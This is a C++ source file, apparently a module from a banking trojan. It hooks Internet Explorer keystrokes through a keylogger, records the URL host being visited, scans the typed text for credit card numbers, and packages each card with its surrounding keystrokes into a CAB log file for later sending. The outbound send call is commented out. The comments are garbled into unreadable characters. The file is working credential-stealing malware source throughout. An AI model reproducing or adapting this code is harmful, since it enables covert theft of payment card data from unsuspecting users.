#include "BotDebug.h"

namespace DBGCC
{
	#include "DbgTemplates.h"
}

#define CCDBG DBGCC::DBGOutMessage<>

#define CCModule //������� ��� ������ �������

//������� ���������� ������ ��������, ��� ���������� � ����� CreditCardNomber.cpp
int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd );
//������� ������������� ������� � ��������� ��� ��������, ���������� � ����� UniversalKeyLogger.cpp
bool GetNonPrintCharText(DWORD Char, PCHAR &Buf);

namespace CC
{

struct UrlKeys
{
	char url[64]; //����� �� ������� ������ �������
	char keys[256]; //���� ��������� ��������
	int endPos; //������� ���������� ���������� ������� 
	char numCard[24]; //����� ��������� �����
	int posCard; //������� ��������� ����� � ������� keys (-1 - ����� �� �������)
	int posEndCard; //������� ��������� ����� ���������� ������ �����
};

UrlKeys* currData; //���� ������� ����� ������
PList listData; //������ ����������� �����

static UrlKeys* AddUrl( const char* url )
{
	UrlKeys* uk = (UrlKeys*)MemAlloc( sizeof(UrlKeys) );
	if( uk == 0 ) return 0;
	int len = m_lstrlen(url);
	if( len >= sizeof(uk->url) ) len = sizeof(uk->url) - 1;
	m_memcpy( uk->url, url, len );
	uk->url[len] = 0;
	uk->endPos = -1;
	uk->posCard = -1;
	return uk;
}

static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	TURLREC UR;
	if( ParseURL( (char*)Data, &UR, false ) )
	{
		//���� ����� ��� � ������
		int count = List::Count(listData);
		currData = 0;
		for( int i = 0; i < count; i++ )
		{
			UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
			if( m_lstrcmp( uk->url, UR.Host ) == 0 )
			{
				currData = uk;
				break;
			}
		}
		if( currData == 0 ) //������ ���� ��� �� ����, ���������
			currData = AddUrl(UR.Host);
		ClearURL(&UR);
	}
	//���� �� �����-�� ������� ��� �� ��� ������ ��� �� ��� ��������, �� ��������� �� ��������� �����������
	if( currData == 0 )
		currData = (UrlKeys*)List::GetItem( listData, 0 );
	CCDBG( "CC", "�������� ��� %s", currData->url );
}

static char* CharToHex( unsigned char c, char* buf )
{
	buf[0] = '{';
	buf[1] = '0';
	buf[2] = 'x';
	int v = c >> 4;
	buf[3] = v <= 9 ? '0' + v : 'A' + v - 10;
	v = c & 0xf;
	buf[4] = v <= 9 ? '0' + v : 'A' + v - 10;
	buf[5] = '}';
	buf[6] = 0;
	return buf;
}

static void SendLog( UrlKeys* uk )
{
	CCDBG( "CC", "������� �������� %s, ������� %d, ���: '%s'", uk->numCard, uk->posCard, uk->url );
	char* mem = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
	fwsprintfA pwsprintf = Get_wsprintfA();
	pwsprintf( mem, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );

	int delim = 0; //������� ���������� ������ ��� ��������� ������ �����
	for( int i = 0; i <= uk->endPos; i++ )
	{
		char* buf;
		unsigned char c = uk->keys[i];
		//�������� ����� ����� � ������ ��������
		if( i == currData->posCard && delim == 0 )
		{
			c = '[';
			i--;
			delim++;
		}
		if( i == currData->posEndCard + 1 && delim == 1 )
		{
			c = ']';
			i--;
			delim++;
		}
		if( GetNonPrintCharText( c, buf ) )
		{
			m_lstrcat( mem, buf );
			STR::Free(buf);
		}
		else
		{
			char buf[16];
			if( (unsigned char)uk->keys[i] < 32 )
			{
				CharToHex( c, buf );
			}
			else
			{
				buf[0] = c;
				buf[1] = 0;
			}
			m_lstrcat( mem, buf );
		}
	}
	int len = m_lstrlen(mem);
	char cabFile[MAX_PATH];
	File::GetTempName(cabFile);
	HCAB cab = CreateCab(cabFile);
	AddBlobToCab( cab, mem, len, "LogFile.txt" );
	CloseCab(cab);
//	CCDBG( "CC", "CAB �������� � ����� %s", cabFile );
//	DataGrabber::SendCabDelayed( 0, cabFile, "CC" );
	pDeleteFileA(cabFile);
	MemFree(mem);
	//������� �����
	uk->endPos = -1;
	uk->posCard = -1;
}

static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
{
	char* keys = (char*)Data;
	while( *keys )
	{
		currData->endPos++;
		if( currData->endPos >= sizeof(currData->keys) ) //����� ��������, �������� ���, ������ 1-� ������
		{
			m_memcpy( currData->keys, currData->keys + 1, sizeof(currData->keys) );
			currData->endPos--;
			if( currData->posCard >= 0 ) currData->posCard--; //������� �������� ���� ����������
		}
		currData->keys[currData->endPos] = *keys;
		
		if( currData->posCard >= 0 ) //�������� �������
		{
			//���� ����� ������ �������� ����� ����� 100 ��������, �������� ��� � �������
			if( currData->endPos - currData->posCard >= 100 )
				SendLog(currData);
		}
		else //�������� ��� �� �������
		{
			if( currData->endPos > 100 ) //�������� ���������� �������� ������ ����� ����� 100 ��������
			{
				currData->posCard = FindCreditCard( currData->keys, currData->endPos, 0, currData->numCard, currData->posEndCard );
				if( currData->posCard >= 0 )
				{
					CCDBG( "CC", "���������� ����� %s", currData->numCard );
				}
			}
		}
		keys++;
	}
}


bool Init(DWORD hashApp)
{
	PKeyLogSystem S = KeyLogger::AddSystem("CC", PROCESS_HASH_IE);
	if( S != NULL )
	{
		S->TimeMode = KLG_TIME_INFINITE;
		PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "*", "*", FILTRATE_ALL_WND, LOG_KEYBOARD, 5);
		listData = List::Create();
		//��������� ������� ��� ����� ������������� ������� ����� ��� ����������
		currData = AddUrl("Unknow url");
		if( currData )
		{
			KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, URLChanged);
			KeyLogger::ConnectEventHandler(KLE_ADD_TEXT_LOG, PushedKey);
			CCDBG( "CC", "������� �� ��������" );
			return true;
		}
	}
	return false;
};

}

